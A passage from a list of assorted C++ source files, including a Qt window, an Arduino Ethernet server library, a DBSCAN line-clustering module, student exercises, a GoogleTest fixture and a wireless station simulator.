3:\n\t\t\t\ttraverse();\n\t\t\t\tbreak;\n\t\t\tcase 4:\n\t\t\t\tsearchData();\n\t\t\t\tbreak;\n\t\t\tcase 5:\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tcout << \"Pilihan tidak ada\" << endl;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tcatch (exception e)\n\t\t{\n\t\t\tcout << \"Terjadi Kesalahan\" << endl;\n\t\t}\n\n\t} while (pilihan != 5);\n}\n",
    "#include \"trainerwindow.h\"\r\n#include \"ui_trainerwindow.h\"\r\n\r\ntrainerWindow::trainerWindow(QString user, QString login, QWidget *parent)\r\n    : QMainWindow(parent)\r\n    , ui(new Ui::trainerWindow)\r\n    , cUser(user)\r\n    , cLogin(login)\r\n{\r\n    ui->setupUi(this);\r\n    ui->current_user->setText(cUser);\r\n    ui->login_as->setText(cLogin);\r\n    QPixmap logout(\":/rsc/img/logout2.png\");\r\n    QIcon icon(logout);\r\n    ui->sign_out->setIcon(icon);\r\n    //ui->sign_out->setToolTip(\"sign out\");\r\n}\r\n\r\ntrainerWindow::~trainerWindow()\r\n{\r\n    delete ui;\r\n}\r\n\r\nvoid trainerWindow::on_pushButton_1_clicked()\r\n{\r\n    ui->stackedWidget->setCurrentIndex(0);\r\n}\r\n\r\n\r\nvoid trainerWindow::on_pushButton_2_clicked()\r\n{\r\n    ui->stackedWidget->setCurrentIndex(1);\r\n}\r\n\r\nvoid trainerWindow::on_pushButton_3_clicked()\r\n{\r\n    ui->stackedWidget->setCurrentIndex(2);\r\n}\r\n\r\nvoid trainerWindow::on_pushButton_4_clicked()\r\n{\r\n    ui->stackedWidget->setCurrentIndex(3);\r\n}\r\n\r\nvoid trainerWindow::on_pushButton_5_clicked()\r\n{\r\n    ui->stackedWidget->setCurrentIndex(4);\r\n}\r\n",
    "/* Copyright 2018 Paul Stoffregen\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy of this\n * software and associated documentation files (the \"Software\"), to deal in the Software\n * without restriction, including without limitation the rights to use, copy, modify,\n * merge, publish, distribute, sublicense, and/or sell copies of the Software, and to\n * permit persons to whom the Software is furnished to do so, subject to the following\n * conditions:\n *\n * The above copyright notice and this permission notice shall be included in all\n * copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,\n * INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A\n * PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT\n * HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION\n * OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE\n * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n */\n\n#include <Arduino.h>\n#include \"Ethernet.h\"\n#include \"utility/w5100.h\"\n\nuint16_t EthernetServer::server_port[MAX_SOCK_NUM];\n\n\nvoid EthernetServer::begin()\n{\n\tuint8_t sockindex = Ethernet.socketBegin(SnMR::TCP, _port);\n\tif (sockindex < MAX_SOCK_NUM) {\n\t\tif (Ethernet.socketListen(sockindex)) {\n\t\t\tserver_port[sockindex] = _port;\n\t\t} else {\n\t\t\tEthernet.socketDisconnect(sockindex);\n\t\t}\n\t}\n}\n\nEthernetClient EthernetServer::available()\n{\n\tbool listening = false;\n\tuint8_t sockindex = MAX_SOCK_NUM;\n\tuint8_t chip, maxindex=MAX_SOCK_NUM;\n\n\tchip = W5100.getChip();\n\tif (!chip) return EthernetClient(MAX_SOCK_NUM);\n#if MAX_SOCK_NUM > 4\n\tif (chip == 51) maxindex = 4; // W5100 chip never supports more than 4 sockets\n#endif\n\tfor (uint8_t i=0; i < maxindex; i++) {\n\t\tif (server_port[i] == _port) {\n\t\t\tuint8_t stat = Ethernet.socketStatus(i);\n\t\t\tif (stat == SnSR::ESTABLISHED || stat == SnSR::CLOSE_WAIT) {\n\t\t\t\tif (Ethernet.socketRecvAvailable(i) > 0) {\n\t\t\t\t\tsockindex = i;\n\t\t\t\t} else {\n\t\t\t\t\t// remote host closed connection, our end still open\n\t\t\t\t\tif (stat == SnSR::CLOSE_WAIT) {\n\t\t\t\t\t\tEthernet.socketDisconnect(i);\n\t\t\t\t\t\t// status becomes LAST_ACK for short time\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t} else if (stat == SnSR::LISTEN) {\n\t\t\t\tlistening = true;\n\t\t\t} else if (stat == SnSR::CLOSED) {\n\t\t\t\tserver_port[i] = 0;\n\t\t\t}\n\t\t}\n\t}\n\tif (!listening) begin();\n\treturn EthernetClient(sockindex);\n}\n\nEthernetClient EthernetServer::accept()\n{\n\tbool listening = false;\n\tuint8_t sockindex = MAX_SOCK_NUM;\n\tuint8_t chip, maxindex=MAX_SOCK_NUM;\n\n\tchip = W5100.getChip();\n\tif (!chip) return EthernetClient(MAX_SOCK_NUM);\n#if MAX_SOCK_NUM > 4\n\tif (chip == 51) maxindex = 4; // W5100 chip never supports more than 4 sockets\n#endif\n\tfor (uint8_t i=0; i < maxindex; i++) {\n\t\tif (server_port[i] == _port) {\n\t\t\tuint8_t stat = Ethernet.socketStatus(i);\n\t\t\tif (sockindex == MAX_SOCK_NUM &&\n\t\t\t  (stat == SnSR::ESTABLISHED || stat == SnSR::CLOSE_WAIT)) {\n\t\t\t\t// Return the connected client even if no data received.\n\t\t\t\t// Some protocols like FTP expect the server to send the\n\t\t\t\t// first data.\n\t\t\t\tsockindex = i;\n\t\t\t\tserver_port[i] = 0; // only return the client once\n\t\t\t} else if (stat == SnSR::LISTEN) {\n\t\t\t\tlistening = true;\n\t\t\t} else if (stat == SnSR::CLOSED) {\n\t\t\t\tserver_port[i] = 0;\n\t\t\t}\n\t\t}\n\t}\n\tif (!listening) begin();\n\treturn EthernetClient(sockindex);\n}\n\nEthernetServer::operator bool()\n{\n\tuint8_t maxindex=MAX_SOCK_NUM;\n#if MAX_SOCK_NUM > 4\n\tif (W5100.getChip() == 51) maxindex = 4; // W5100 chip never supports more than 4 sockets\n#endif\n\tfor (uint8_t i=0; i < maxindex; i++) {\n\t\tif (server_port[i] == _port) {\n\t\t\tif (Ethernet.socketStatus(i) == SnSR::LISTEN) {\n\t\t\t\treturn true; // server is listening for incoming clients\n\t\t\t}\n\t\t}\n\t}\n\treturn false;\n}\n\n#if 0\nvoid EthernetServer::statusreport()\n{\n\tSerial.printf(\"EthernetServer, port=%d\\n\", _port);\n\tfor (uint8_t i=0; i < MAX_SOCK_NUM; i++) {\n\t\tuint16_t port = server_port[i];\n\t\tuint8_t stat = Ethernet.socketStatus(i);\n\t\tconst char *name;\n\t\tswitch (stat) {\n\t\t\tcase 0x00: name = \"CLOSED\"; break;\n\t\t\tcase 0x13: name = \"INIT\"; break;\n\t\t\tcase 0x14: name = \"LISTEN\"; break;\n\t\t\tcase 0x15: name = \"SYNSENT\"; break;\n\t\t\tcase 0x16: name = \"SYNRECV\"; break;\n\t\t\tcase 0x17: name = \"ESTABLISHED\"; break;\n\t\t\tcase 0x18: name = \"FIN_WAIT\"; break;\n\t\t\tcase 0x1A: name = \"CLOSING\"; break;\n\t\t\tcase 0x1B: name = \"TIME_WAIT\"; break;\n\t\t\tcase 0x1C: name = \"CLOSE_WAIT\"; break;\n\t\t\tcase 0x1D: name = \"LAST_ACK\"; break;\n\t\t\tcase 0x22: name = \"UDP\"; break;\n\t\t\tcase 0x32: name = \"IPRAW\"; break;\n\t\t\tcase 0x42: name = \"MACRAW\"; break;\n\t\t\tcase 0x5F: name = \"PPPOE\"; break;\n\t\t\tdefault: name = \"???\";\n\t\t}\n\t\tint avail = Ethernet.socketRecvAvailable(i);\n\t\tSerial.printf(\"  %d: port=%d, status=%s (0x%02X), avail=%d\\n\",\n\t\t\ti, port, name, stat, avail);\n\t}\n}\n#endif\n\nsize_t EthernetServer::write(uint8_t b)\n{\n\treturn write(&b, 1);\n}\n\nsize_t EthernetServer::write(const uint8_t *buffer, size_t size)\n{\n\tuint8_t chi",
    "// #include <iostream>\r\n// #include <stdio.h>\r\n// #include <stdlib.h>\r\n// #include \"node.hpp\"\r\n// #include <fstream>\r\n// #include <vector>\r\n#include \"bst.cpp\"\r\nusing namespace std;\r\n\r\n/* \r\nReferences:\r\n- the file reading and writing codes are from Codio's C++ fundamentals course.\r\n- bst algorithms are from DSA.\r\n*/\r\n\r\nBSTNode* root = NULL; // this is the root of BST\r\n\r\n// You have to define the functions below\r\nBSTNode* loadTrucks(BST* bst);\r\nvoid makeJourney(BST* bst, BSTNode* root);\r\nvoid unloadTrucks(BST* bst, BSTNode* root);\r\n\r\nint main()\r\n{\r\n\tBST* bst = new BST(); // all the truck objects are in this bst\r\n    root = loadTrucks(bst);\t\r\n    makeJourney(bst, root);\r\n    bst->printInorder(root); // just for testing\r\n\tunloadTrucks(bst, root); \r\n\tdelete bst; // deletes the memory allocated by the new operator\r\n    return 0;\r\n}\r\n\r\n// returns the root node of the bst\r\nBSTNode* loadTrucks(BST* bst){\r\n\tBSTNode* root = nullptr;\r\n    string path = \"Input.txt\";\r\n\tint counter = 0; // for the switch case, truck obj is populated with the help of this\t\r\n\tTruck x; // temp variable to populate the bst\r\n\ttry {\r\n\t\tifstream file;\r\n\t\tstring read;\r\n\t\tfile.open(path);\r\n\t\tif (!file) {\r\n\t\t\tthrow runtime_error(\"File failed to open.\");\r\n\t\t}\r\n\t\twhile(!file.eof()){\r\n\t\t\tgetline(file, read, '\\n'); //specify newline as delimiter\r\n\t\t\tswitch (counter)\r\n\t\t\t{\r\n\t\t\t\tcase 0:\r\n\t\t\t\t\tx.driver = read;\r\n\t\t\t\t\tcounter++;\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\r\n\t\t\t\tcase 1:\r\n\t\t\t\t\tx.petrol = stod(read);\r\n\t\t\t\t\tcounter++;\r\n\t\t\t\t\tbreak;\r\n\r\n\t\t\t\tcase 2:\r\n\t\t\t\t\tx.regNo = read;\r\n\t\t\t\t\tcounter++;\r\n\t\t\t\t\tbreak;\r\n\r\n\t\t\t\tcase 3:\r\n\t\t\t\t\tx.fullMileage = stoi(read);\r\n\t\t\t\t\tcounter++;\r\n\t\t\t\t\tbreak;\r\n\r\n\t\t\t\tcase 4:\t\t\t\t\r\n\t\t\t\t\tx.emptyMileage = stoi(read);\r\n\t\t\t\t\troot = bst->insert(root, x);\r\n\t\t\t\t\tcounter = 0; // set to zero because all the info has been read\r\n\t\t\t\t\tbreak;\r\n\r\n\t\t\t\tdefault:\r\n\t\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t\t\r\n\t\tfile.close();\r\n\t\t}\r\n\t\tcatch (exception& e) {\r\n\t\t\tcerr << e.what() << endl;\r\n\t\t}\r\n\t\treturn root; // pointer of the bst root\r\n    \r\n}\r\n\r\nvoid makeJourney(BST* bst, BSTNode* root){\r\n\t// simply calls class' own function\r\n\tbst->journey(root);\r\n}\r\n\r\nvoid unloadTrucks(BST* bst, BSTNode* root){\r\n\t// calls the class function\r\n\tbst->write(root);\r\n}",
    "//@author:lenglinxiao\n//@data:2024/3/20\n//@email:lenglinxiao@foxmail.com\n#include \"depth_chart.h\"\n\nstd::ostream &operator<<(std::ostream &os, const cv::Point &point)\n{\n    os << \"(\" << point.x << \", \" << point.y << \")\";\n    return os;\n}\n\nCvPoint operator-(CvPoint p1, CvPoint p2)\n{\n    CvPoint p3;\n    p3.x = p1.x - p2.x;\n    p3.y = p1.y - p2.y;\n    return p3;\n}\n\nbool operator==(Parking p1,Parking p2)\n{\n    return p1.parking_type==p2.parking_type;\n}\n\nfloat image_data::lineDistance(const cv::Vec4i &line1, const cv::Vec4i &line2)\n{\n    cv::Point pt1(line1[0], line1[1]), pt2(line1[2], line1[3]),\n        pt3(line2[0], line2[1]), pt4(line2[2], line2[3]),\n        pt5((pt1 + pt2) / 2), pt6((pt3 + pt4) / 2);\n\n    // \u8ba1\u7b97\u6240\u6709\u53ef\u80fd\u7684\u70b9\u5bf9\u7ec4\u5408\u4e2d\u7684\u6700\u5c0f\u8ddd\u79bb\n    float minDist = std::min({calculatedistance(pt1, pt3), calculatedistance(pt1, pt4),\n                              calculatedistance(pt2, pt3), calculatedistance(pt2, pt4), calculatedistance(pt5, pt6)});\n    return minDist;\n}\n\nstd::vector<int> image_data::DBSCAN(const std::vector<cv::Vec4i> &lines, float eps, int minPts)\n{\n    std::vector<int> labels(lines.size(), -1); // \u521d\u59cb\u5316\u6240\u6709\u7ebf\u6bb5\u7684\u6807\u7b7e\u4e3a -1\uff08\u672a\u5206\u7c7b\uff09\n    int clusterId = 0;\n    for (size_t i = 0; i < lines.size(); ++i)\n    {\n        if (labels[i] != -1)\n            continue; // \u5982\u679c\u7ebf\u6bb5\u5df2\u7ecf\u88ab\u5206\u7c7b\uff0c\u5219\u8df3\u8fc7\n\n        // \u5bfb\u627e\u7ebf\u6bb5\u7684\u90bb\u57df\n        std::vector<int> neighbors;\n        for (size_t j = 0; j < lines.size(); ++j)\n        {\n            if (lineDistance(lines[i], lines[j]) < eps)\n            {\n                neighbors.push_back(j);\n            }\n        }\n\n        if (neighbors.size() < minPts)\n        {\n            labels[i] = 0; // \u6807\u8bb0\u4e3a\u566a\u58f0\n            continue;\n        }\n\n        // \u521b\u5efa\u65b0\u7684\u805a\u7c7b\n        clusterId++;\n        labels[i] = clusterId;\n\n        // \u4e3a\u5f53\u524d\u7ebf\u6bb5\u7684\u6240\u6709\u90bb\u57df\u7ebf\u6bb5\u5206\u914d\u805a\u7c7b\u6807\u7b7e\n        for (size_t k = 0; k < neighbors.size(); ++k)\n        {\n            int neighborIdx = neighbors[k];\n            if (labels[neighborIdx] == -1)\n            {\n                labels[neighborIdx] = clusterId;\n                // \u5c06\u90bb\u57df\u7ebf\u6bb5\u7684\u90bb\u57df\u4e5f\u52a0\u5165\u5230\u5f53\u524d\u805a\u7c7b\u4e2d   DBSCAN\u7684\u7b2c\u4e8c\u4e2a\u601d\u60f3:\u9886\u57df\u96c6\u5408\u601d\u60f3\n                for (size_t l = 0; l < lines.size(); ++l)\n                {\n                    if (lineDistance(lines[neighborIdx], lines[l]) < eps && std::find(neighbors.begin(), neighbors.end(), l) == neighbors.end())\n                    {\n                        neighbors.push_back(l);\n                    }\n                }\n            }\n        }\n    }\n    return labels;\n}\n\n// \u8ba1\u7b97\u70b9\u8ddd\u79bb\u51fd\u6570\ndouble image_data::calculatedistance(const Point &point1, const Point &point2)\n{\n    double dist;\n    dist = sqrt(pow((point1.x - point2.x), 2) + pow((point1.y - point2.y), 2));\n    return dist;\n}\n\n// IPM\u56fe\u5750\u6807\u7cfb\u8f6c\u5230VCS\u5750\u6807\u7cfb\nvoid image_data::IPMtoVCS(const cv::Point2f &pt_img, cv::Point2f *pt_vcs)\n{\n    (*pt_vcs).x = (ipm_parsing_image_height / 2 - pt_img.y) * ipm_meters_per_pixel + center_offset;\n    (*pt_vcs).y = (ipm_parsing_image_width / 2 - pt_img.x) * ipm_meters_per_pixel;\n}\n// VCS\u5750\u6807\u7cfb\u8f6c\u56de\u5230IPM\u5750\u6807\u7cfb\nvoid image_data::VCStoIPM(const cv::Point2f &pt_vcs, cv::Point2f *pt_img)\n{\n    (*pt_img).y = ipm_parsing_image_height / 2 - (pt_vcs.x - center_offset) / ipm_meters_per_pixel;\n    (*pt_img).x = ipm_parsing_image_width / 2 - pt_vcs.y / ipm_meters_per_pixel;\n}\n\n// \u89d2\u5ea6\u8ba1\u7b97\u51fd\u6570\ndouble image_data::calculateLineAngles(const cv::Point2f &point1, const cv::Point2f &point2)\n{\n    double angle = std::atan2(point2.y - point1.y, point2.x - point1.x) * 180.0 / CV_PI;\n    if (angle < 0)\n    {\n        angle += 180;\n    }\n    return angle;\n}\n\n// \u8ba1\u7b97X\u5750\u6807\u6700\u5927\u503c\ndouble image_data::calculateMaxXDistance(const cv::Vec4i &line1, const cv::Vec4i &line2)\n{\n    int minX1 = std::min(line1[1], line1[3]);\n    int maxX1 = std::max(line1[1], line1[3]);\n    int minX2 = std::min(line2[1], line2[3]);\n    int maxX2 = std::max(line2[1], line2[3]);\n    int maxDistance = std::max(std::abs(minX1 - minX2), std::abs(maxX1 - maxX2));\n    return maxDistance;\n}\n\n// \u6839\u636eX\u91cd\u65b0\u805a\u7c7b\u51fd\u6570\nstd::vector<int> image_data::mergeClusters2(const std::vector<Vec4i> &lines, std::vector<int> &labels, int maxClusters, float maxGapX)\n{\n    std::map<int, std::vector<cv::Vec4i>> clusters;\n    for (size_t i = 0; i < lines.size(); ++i)\n    {\n        if (labels[i] > 0)\n        {\n            clusters[labels[i]].push_back(lines[i]);\n        }\n    }\n\n    // \u5f3a\u5236\u5408\u5e76X\u5750\u6807\u5dee\u503c\u5c0f\u4e8emaxGapX\u7684\u805a\u7c7b\n    bool mergeOccurred;\n    do\n    {\n        mergeOccurred = false;\n        for (auto jt1 = clusters.begin(); jt1 != clusters.end() && !mergeOccurred; ++jt1)\n        {\n            for (auto jt2 = std::next(jt1); jt2 != clusters.end() && !mergeOccurred; ++jt2)\n            {\n                float average_center1 = calculate_average_center(jt1->second);\n                float average_center2 = calculate_average_center(jt2->second);\n                if (std::abs(average_center1 - average_center2) < maxGapX)\n                {\n                    // \u66f4\u65b0\u6807\u7b7e\n                    int mergeId1 = jt1->first;\n                    int mergeId2 = jt2->first;\n                    for (auto &label : labels)\n                    {\n                        if (label == mergeId2)\n              ",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\nusing namespace std;\n\n// Function to generate random number between 1 and 100\nint generateRandomNumber() {\n    return rand() % 100 + 1;\n}\n\n// Function to check if guess is correct\nbool isGuessCorrect(int randomNumber, int guess) {\n    return randomNumber == guess;\n}\n\nint main() {\n    // Seed the random number generator\n    srand(time(0));\n\n    int randomNumber = generateRandomNumber();\n    int guess;\n    int attempts = 0;\n\n    cout << \"Welcome to the Number Guessing Game!\" << endl;\n    cout << \"I've picked a number between 1 and 100. Try to guess it!\" << endl;\n\n    do {\n        cout << \"Enter your guess: \";\n        cin >> guess;\n        attempts++;\n\n        if (isGuessCorrect(randomNumber, guess)) {\n            cout << \"Congratulations! You've guessed the number in \" << attempts << \" attempts.\" << endl;\n        } else if (guess < randomNumber) {\n            cout << \"Too low! Try again.\" << endl;\n        } else {\n            cout << \"Too high! Try again.\" << endl;\n        }\n\n    } while (!isGuessCorrect(randomNumber, guess));\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <vector>\n#include <string>\n\ntypedef void(*function)();\n\nvoid forEach(std::string txt, void(*func)(char));\nvoid forEach(std::vector<int> arr, void(*func)(int));\nvoid forEach(std::vector<std::string> arr, void(*func)(std::string));\nvoid runCode(function cb);\n\nint main() {\n    \n    std::vector<int> numbers = {10,39,21,38};\n    std::vector<std::string> names = {\"Gab\", \"Rose\", \"Kyle\"};\n    \n    forEach(\"Hello\", [](char c) -> void {\n        std::cout << c << std::endl;\n    });\n    \n    forEach(numbers, [](int x) -> void {\n        int z = x + 10;\n        std::cout << z << std::endl;\n    });\n    \n    forEach(names, [](std::string name) -> void {\n        std::cout << name << std::endl;\n    });\n\n    runCode([]() -> void {\n        std::cout << \"Hello World\" << std::endl;\n    });\n    return 0;\n}\n\n//string\nvoid forEach(std::string txt, void(*func)(char)) {\n    for(int i = 0; i < txt.length(); i++) {\n        func(txt[i]);\n    }\n}\n\n//vector int\nvoid forEach(std::vector<int> arr, void(*func)(int)) {\n    for(int i = 0; i < arr.size(); i++) {\n        func(arr[i]);\n    }\n}\n\n//vector string\nvoid forEach(std::vector<std::string> arr, void(*func)(std::string)) {\n    for(int i = 0; i < arr.size(); i++) {\n        func(arr[i]);\n    }\n}\n\n//Typedef Function\nvoid runCode(function cb){\n    cb();\n}",
    "//////////////////////////////////  @\u7248\u6743\u8bf4\u660e  //////////////////////////////////////////////////\r\n///\t\t\t\t\t\tJiedi(China nanjing)Ltd.                                    \r\n/// @\u7248\u6743\u8bf4\u660e \u4ee3\u7801\u548c\u8bfe\u7a0b\u7248\u6743\u6709\u590f\u66f9\u4fca\u6240\u62e5\u6709\u5e76\u5df2\u7ecf\u7533\u8bf7\u8457\u4f5c\u6743\uff0c\u6b64\u4ee3\u7801\u53ef\u7528\u4f5c\u4e3a\u5b66\u4e60\u53c2\u8003\u5e76\u53ef\u5728\u9879\u76ee\u4e2d\u4f7f\u7528\uff0c\r\n/// \u8bfe\u7a0b\u4e2d\u6d89\u53ca\u5230\u7684\u5176\u4ed6\u5f00\u6e90\u8f6f\u4ef6\uff0c\u8bf7\u9075\u5b88\u5176\u76f8\u5e94\u7684\u6388\u6743\r\n/// \u8bfe\u7a0b\u6e90\u7801\u4e0d\u53ef\u4ee5\u76f4\u63a5\u8f6c\u8f7d\u5230\u516c\u5f00\u7684\u535a\u5ba2\uff0c\u6216\u8005\u5176\u4ed6\u5171\u4eab\u5e73\u53f0\uff0c\u4e0d\u53ef\u4ee5\u7528\u4ee5\u5236\u4f5c\u5728\u7ebf\u8bfe\u7a0b\u3002\r\n/// \u8bfe\u7a0b\u4e2d\u6d89\u53ca\u5230\u7684\u5176\u4ed6\u5f00\u6e90\u8f6f\u4ef6\uff0c\u8bf7\u9075\u5b88\u5176\u76f8\u5e94\u7684\u6388\u6743  @@              \r\n/////////////////////////////////////////////////////////////////////////////////////////////////\r\n\r\n//////////////////////////////////  \u6e90\u7801\u8bf4\u660e  //////////////////////////////////////////////////\r\n/// \u9879\u76ee\u540d\u79f0: CMake\u6784\u5efa\u5927\u578bc++\u9879\u76ee\r\n/// \u535a\u5ba2   : \t\t\t    http://blog.csdn.net/jiedichina\r\n/// \u817e\u8baf\u8bfe\u5802\t\t\t    https://jiedi.ke.qq.com/\r\n/// \u5b66\u6d6a\t\t\t\t    \u641c\u7d22 \u590f\u66f9\u4fca\r\n/// \u8001\u590f\u8bfe\u5802\t\t\t    http://cppds.com \r\n/// CMake\u624b\u518c    \t        http://cmake.org.cn\r\n/// \uff01\uff01\uff01\u8bf7\u52a0\u5165\u8bfe\u7a0bqq\u7fa4 \u3010296249312\u3011\u4e0e\u540c\u5b66\u4ea4\u6d41 \r\n/// \u6b22\u8fce\u52a0\u590f\u66f9\u4fca\u8001\u5e08\u7684\u5fae\u4fe1\uff1acppxcj\r\n///\u52a0\u5165\u8001\u590f\u8bfe\u5802\u7fa4\u3010296249312\u3011\u76f4\u63a5\u8054\u7cfb\u7fa4\u91cc\u5ba2\u670d\u4e0b\u8f7d\u8bfe\u7a0b\u8d44\u6599\r\n/////////////////////////////////////////////////////////////////////////////////////////////////\r\n/////////////////////////////////// \u8bfe\u7a0b\u4ea4\u6d41qq\u7fa4296249312 //////////////////////////////////////\r\n/////////////////////////////////////////////////////////////////////////////////////////////////\r\n\r\n//////////////////////////////////////// COMMENT ///////////////////////////////////////////////\r\n\r\n#include <iostream>\r\n#include \"xthread_pool.h\"\r\n#include \"gtest/gtest.h\"\r\nusing namespace std;\r\n\r\n \r\n//namespace {\r\n\r\n// The fixture for testing class Foo.\r\nclass XThreadPoolTest : public ::testing::Test {\r\n protected:\r\n  // You can remove any or all of the following functions if their bodies would\r\n  // be empty.\r\n\r\n  XThreadPoolTest() {\r\n     // You can do set-up work for each test here.\r\n  }\r\n\r\n  ~XThreadPoolTest() override {\r\n     // You can do clean-up work that doesn't throw exceptions here.\r\n  }\r\n\r\n  // If the constructor and destructor are not enough for setting up\r\n  // and cleaning up each test, you can define the following methods:\r\n  void SetUp() override {\r\n     // Code here will be called immediately after the constructor (right\r\n     // before each test).\r\n     cout<<\"SetUp XThreadPoolTest\"<<endl;\r\n  }\r\n\r\n  void TearDown() override {\r\n     // Code here will be called immediately after each test (right\r\n     // before the destructor).\r\n     cout<<\"TearDown XThreadPoolTest\"<<endl;\r\n  }\r\n  // Class members declared here can be used by all tests in the test suite\r\n  // for Foo.\r\n};\r\n\r\n// Tests that the Foo::Bar() method does Abc. \u6d4b\u8bd5\r\nTEST_F(XThreadPoolTest, Init) {\r\n  EXPECT_EQ(7 * 6, 42);\r\n}\r\n\r\nint main(int argc,char *argv[])\r\n{\r\n    cout<<\"test xthread\"<<endl;\r\n    testing::InitGoogleTest(&argc, argv);\r\n    return RUN_ALL_TESTS();\r\n}\r\n",
    "/*\n * example reads single adc input on interval and prints value\n *\n * build:\n * > make\n *\n  * run:\n * > ./read_loop_ads115\n *\n * read_loop_ads1115.cpp\n */\n\n#include <stdio.h>\n#include <csignal>\n\n#include \"ads1115_lib.h\"\n\n#define PORT 1\n#define LOOP_MS 2000\n\nint32_t interval_id = -1;\n\n// signal handler\nvoid onCtrlC(int signum)\n{\n\t// stop any adc conversion\n\tads1115::stop_convert(PORT);\n\n\t// stop interval\n\tads1115::clear_interval(interval_id);\n}\n\nvoid interval_callback()\n{\n    double value;\n\n    bool ret = ads1115::read(\n        PORT,\n        ads1115::ADR_48,\n        ads1115::MUX_I0_GND,\n        ads1115::GAIN_4096,\n        ads1115::RATE_128,\n        false,\n        value);\n\n    if (ret)\n        printf(\"%.0fmV\\n\", value);\n    else\n    {\n        printf(\"%s\\n\", ads1115::error_text());\n\n        // stop interval\n        ads1115::clear_interval(interval_id);\n    }\n}\n\nint main()\n{\n    signal(SIGINT, onCtrlC);\n\n    puts(\"stop program with Ctrl+C\");\n\n    // start interval\n    ads1115::set_interval(interval_callback, LOOP_MS, &interval_id);\n\n    puts(\"\\nprogram stopped\");\n\n    return 0;\n}\n\n\n",
    "#include \"station.h\"\r\nusing namespace std;\r\nStation::Station()\r\n{\r\n\t\r\n}\r\n\r\nbool Station::compareBySTAID(const Station& s1, const Station& s2){\r\n\treturn s1.STA_ID < s2.STA_ID;\r\n}\r\n\r\nbool Station::compareByRD(const Station& s1, const Station& s2){\r\n\treturn s1.required_dr < s2.required_dr;\r\n}\r\n\r\nStation::Station(string device, int STA_ID,int priority, int sim_time, int packet_size)\r\n{\r\n\tthis->device = device;\r\n\tthis->STA_ID = STA_ID;\r\n\tthis->priority = priority;\r\n\tthis->sim_time = sim_time;\r\n\tthis->packet_size = packet_size;\r\n\tlast_packet_sizes[0] = last_packet_sizes[1] = packet_size;\r\n}\r\n\r\nvoid Station::updateRD(int curTime, int ch, bool isJoeFunc, bool two_ch_mode,int Bandwidth,double alpha)//required data rate\r\n{\r\n\t// ch = 0 <- A, 1 <- B, -1 <- dont care, \u53ef\u80fd\u6709\u5169\u500b\u983b\u9053\u7684\u50b3\u8f38\u6b0a\u6216\u662f\u53ea\u8dd1A\u983b\u9053\u5be6\u9a57(\u4e0d\u4ecb\u610f\u88dd\u7f6e\u985e\u578b) \r\n\trequired_dr = 0.0;\r\n\tcur_data_size = 0;\r\n\tdata_rate = 0.0;\r\n\tint MAX_DR = -1;\r\n\r\n\t\r\n\t\r\n\tif(Bandwidth == 148+74) MAX_DR = 3603;\r\n\telse if(Bandwidth == 148) MAX_DR = 2402;\r\n\telse MAX_DR = 1201;\r\n\r\n\tif(device == \"SL\" && ch == 0){\r\n\t\treturn;\r\n\t}\r\n\telse if(device == \"NSTR\" && ch != -1)\r\n\t{\r\n\t\tif(ch == 0 && curTime < last_end_trans_ChB){\r\n\t\t\treturn;\r\n\t\t}\r\n\t\telse if (ch == 1 && curTime < last_end_trans_ChA){\r\n\t\t\treturn;\r\n\t\t}\r\n\t}\r\n\tfor(int i = startIdx; i < packets.size(); i++)\r\n\t{\r\n\t\t//packets[i].canTrans = false;\r\n\t\tif(packets[i].arrival_time <= curTime)\r\n\t\t{\r\n\t\t\t\r\n\t\t\tif(isJoeFunc)\r\n\t\t\t{\r\n\t\t\t\tdouble tmp = double(packets[i].packetSize)/(min(sim_time,packets[i].deadline) - curTime);\r\n\t\t\t\tif(!isinf(tmp) && tmp > 0 && tmp < MAX_DR) required_dr+=tmp;\r\n\t\t\t\telse{\r\n\t\t\t\t\t//startIdx+=1;\r\n\t\t\t\t\tcontinue;\r\n\t\t\t\t}\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t\telse required_dr+= double(packets[i].packetSize);\t\t\t\r\n\t\t\tcur_data_size+=packets[i].packetSize;\r\n\t\t\t\t\t\t\t\t\t\t\t\r\n\t\t\t//\u9019\u88e1\u4e5f\u8a31\u8981\u53bb\u6389\u6975\u7aef\u503c \r\n\t\t}\r\n\t\telse break;\r\n\t}\r\n\tif(!isJoeFunc){\r\n\t\trequired_dr/= double(sim_time)-curTime;\r\n\t}\r\n\tif(two_ch_mode)\r\n\t{\r\n\t\t//assign startIdx to vectors\r\n\t\tcur_data_sizes[0] = cur_data_sizes[1] = cur_data_size;\r\n\t\tstartIdxs[0] = startIdxs[1] = startIdx;\r\n\t}\r\n\trequired_dr*=alpha;//alpha \r\n\t//cout << STA_ID<<\" \u6240\u9700\u8cc7\u6599\u901f\u7387\u66f4\u65b0\u5b8c\u7562 = \"  << required_dr << endl; \r\n}\r\n\r\nvoid Station::updateExpired(int curTime)\r\n{\r\n\tcur_expired_size = 0;\r\n\tlast_expired2_size = last_expired_size;\r\n\tlast_expired_size = cur_expired_size;\r\n\twhile(packets.size() > startIdx)\r\n\t{\r\n\t\tif(curTime > packets[startIdx].deadline) {\r\n\t\t\t//\u5728\u9019\u88e1\u8a08\u7b97\u904e\u671f\u5c01\u5305 \r\n\t\t\tn_expired_packet+=1;\r\n\t\t\tcur_expired_size+=packets[startIdx].packetSize;\r\n\t\t\tstartIdx+=1;\r\n\t\t}\t\t\r\n\t\telse break;\t\t\r\n\t}\r\n\t\r\n\t//cout << STA_ID << \" 